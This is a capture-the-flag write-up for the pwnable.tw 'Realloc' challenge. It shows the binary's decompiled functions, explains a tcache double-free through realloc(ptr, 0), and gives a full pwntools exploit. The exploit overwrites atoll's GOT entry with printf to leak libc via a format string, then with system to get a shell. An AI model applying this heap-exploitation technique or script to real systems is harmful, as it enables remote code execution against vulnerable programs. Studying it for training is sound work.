---
date: '2025-08-29T12:49:08+07:00'
draft: false
title: 'Realloc (200 pts) - pwnable.tw'
tags: ["pwnable.tw"]
---

## 0x1. Initial Reconnaissance 

### file
```
↪ file re-alloc
re-alloc: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=14ee078dfdcc34a92545f829c718d7acb853945b, for GNU/Linux 3.2.0, not stripped
```

### checksec
```
↪ checksec --file=re-alloc
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   83 Symbols	  Partial	1		2		re-alloc
```

### ./re-alloc
```
↪ ./re-alloc
$$$$$$$$$$$$$$$$$$$$$$$$$$$$
🍊      RE Allocator      🍊
$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$   1. Alloc               $
$   2. Realloc             $
$   3. Free                $
$   4. Exit                $
$$$$$$$$$$$$$$$$$$$$$$$$$$$
Your choice:
```


## 0x2. Reverse Engineering

### main
```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  v3 = 0;
  init_proc(argc, argv, envp);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      __isoc99_scanf("%d", &v3);
      if ( v3 != 2 )
        break;
      reallocate();
    }
    if ( v3 > 2 )
    {
      if ( v3 == 3 )
      {
        rfree();
      }
      else
      {
        if ( v3 == 4 )
          _exit(0);
LABEL_13:
        puts("Invalid Choice");
      }
    }
    else
    {
      if ( v3 != 1 )
        goto LABEL_13;
      allocate();
    }
  }
}
```

### Allocate
```c
int allocate()
{
  _BYTE *v0; // rax
  unsigned __int64 v2; // [rsp+0h] [rbp-20h]
  unsigned __int64 size; // [rsp+8h] [rbp-18h]
  void *v4; // [rsp+18h] [rbp-8h]

  printf("Index:");
  v2 = read_long();
  if ( v2 > 1 || heap[v2] )
  {
    LODWORD(v0) = puts("Invalid !");
  }
  else
  {
    printf("Size:");
    size = read_long();
    if ( size <= 0x78 )
    {
      v4 = realloc(0LL, size);
      if ( v4 )
      {
        heap[v2] = v4;
        printf("Data:");
        v0 = (_BYTE *)(heap[v2] + read_input(heap[v2], size));
        *v0 = 0;
      }
      else
      {
        LODWORD(v0) = puts("alloc error");
      }
    }
    else
    {
      LODWORD(v0) = puts("Too large!");
    }
  }
  return (int)v0;
}
```

### Reallocate
```c
int reallocate()
{
  unsigned __int64 v1; // [rsp+8h] [rbp-18h]
  unsigned __int64 size; // [rsp+10h] [rbp-10h]
  void *v3; // [rsp+18h] [rbp-8h]

  printf("Index:");
  v1 = read_long();
  if ( v1 > 1 || !heap[v1] )
    return puts("Invalid !");
  printf("Size:");
  size = read_long();
  if ( size > 0x78 )
    return puts("Too large!");
  v3 = realloc((void *)heap[v1], size);
  if ( !v3 )
    return puts("alloc error");
  heap[v1] = v3;
  printf("Data:");
  return read_input(heap[v1], size);
}
```

### Rfree

```c
int rfree()
{
  _QWORD *v0; // rax
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  printf("Index:");
  v2 = read_long();
  if ( v2 > 1 )
  {
    LODWORD(v0) = puts("Invalid !");
  }
  else
  {
    realloc((void *)heap[v2], 0LL);
    v0 = heap;
    heap[v2] = 0LL;
  }
  return (int)v0;
}
```

### Read_long
```c
__int64 read_long()
{
  char nptr[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v2; // [rsp+28h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  __read_chk(0LL, nptr, 16LL, 17LL);
  return atoll(nptr);
}
```


## 0x3. Analysis

In this challenge, you have three options.
Option 1 - Allocate.
This option allows you to create a chunk, then stores this chunk to an array at 0x4040b0, but this array just has 2 elements.

Option 2 - Reallocate.
You can expand or shrink the chunk as you want :b. 

Option 3 - Rfree.
They realloc the chosen chunk to the size of 0, then assign the chosen index to 0 too.


## 0x4. Exploit

As you can see in Rfree function, they realloc (ptr, 0) instead of free (ptr), and when I observed in gdb, they also put the chosen chunk into tcache. And in Allocate function, they use realloc (0, size) instead of alloc (size). I also tried to expand the chunk, and I see if there's space right after the chunk: it expands in place. So, I can get a conclusion:
```
realloc (0, size) = alloc (size)
realloc (ptr, 0) = free (ptr)
realloc (ptr, larger_size) will expand this chunk in place if there's space right after the chunk.
```

And that means you can use reallocate function to free the chunk but still keep the address. This can lead to Double-Free bug. And you can see in Read_long function, they return atoll (ptr), if you overwrite atoll GOT to printf plt you can use format string bug to leak values on stack. If you overwrite system to atoll, you can get shell :DD.

And now your work is preparing 2 tcache-linkedlists with address of atoll as head of linkedlist, one for libc leak, one for getting shell. To do that, let's take an example, I allocate a chunk of 30 bytes (store this chunk to index 0), then free it with reallocate and overwrite atoll GOT address to the fd pointer. Next allocate a chunk of 30 bytes to index 1, expand it to 50 bytes and free it, I do this because I don't want they put the chunk to the old linkedlist. After free this chunk, I still have its address stored at index 0, I reallocate it again to overwrite fd pointer and tcache key, then I can free it again without fear of crash. Now, I have a tcache-linkedlist with the atoll GOT address as the head, and 2 indexes are null. Do this again, I will reach my target.

Use format string to get the _IO_2_1_stdout_ address. Because the atoll replaced by printf, so you can input "%{you_size}c" instead.

###### Exploit

```py
from pwn import *

exe = ELF("./re-alloc_patched")
libc = ELF("./libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so")
ld = ELF("./ld-2.29.so")

context.binary = exe
context.log_level = "debug"



def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug ([exe.path], "b *main")
    else:
        r = remote("chall.pwnable.tw", 10106)

    return r

def allocate (p, idx, size, data):
    p.sendlineafter (b': ', b'1')
    p.sendafter (b':', idx)
    p.sendafter (b':', size)
    p.sendafter (b':', data)

def re_allocate (p, idx, size, data):
    p.sendlineafter (b': ', b'2')
    p.sendafter (b':', idx)
    p.sendafter (b':', size)
    if size != b'0':
        p.sendafter (b':', data)

def rfree (p, idx):
    p.sendlineafter (b': ', b'3')
    p.sendafter (b':', idx)

def main():
    p = conn()

    allocate (p, b'0', b'30', b'ndd')
    re_allocate (p, b'0', b'0', b'abcd')
    re_allocate (p, b'0', b'30', p64(exe.got['atoll']) + b'A' * 8)

    # reset 
    allocate (p, b'1', b'30', b'ndd')
    re_allocate (p, b'1', b'50', b'ndd')
    rfree (p, b'1')
    re_allocate (p, b'0', b'50', b'A' * 16)
    rfree (p, b'0')


    # reset for later exploit
    allocate (p, b'0', b'20', b'ndd')
    re_allocate (p, b'0', b'0', b'abcd')
    re_allocate (p, b'0', b'20', p64 (exe.got['atoll']))
    allocate (p, b'1', b'20', b'asdkfj')
    re_allocate (p, b'1', b'50', b'ndd')
    rfree (p, b'1')
    re_allocate (p, b'0', b'50', b'A' * 16)
    rfree (p, b'0')
    # ---------------------------------------------------
    
    allocate (p, b'0', b'30', p64 (exe.plt['printf']))

    p.sendlineafter (b': ', b'1')
    p.sendafter (b':', b'%9$llx')

    leak_libc = p.recv(12).decode ('utf-8')
    leak_libc = int (leak_libc, 16)
    print ("The leak from libc is : ", hex(leak_libc))
    libc.address = leak_libc - libc.symbols['_IO_2_1_stdout_']
    print ("The libc address is : ", hex (libc.address))


    allocate (p, b'1', b'%20c', p64 (libc.symbols['system']))    
    p.sendlineafter (b': ', b'1')
    p.sendafter (b':', b'/bin/sh\x00')

    p.interactive()


if __name__ == "__main__":
    main()
```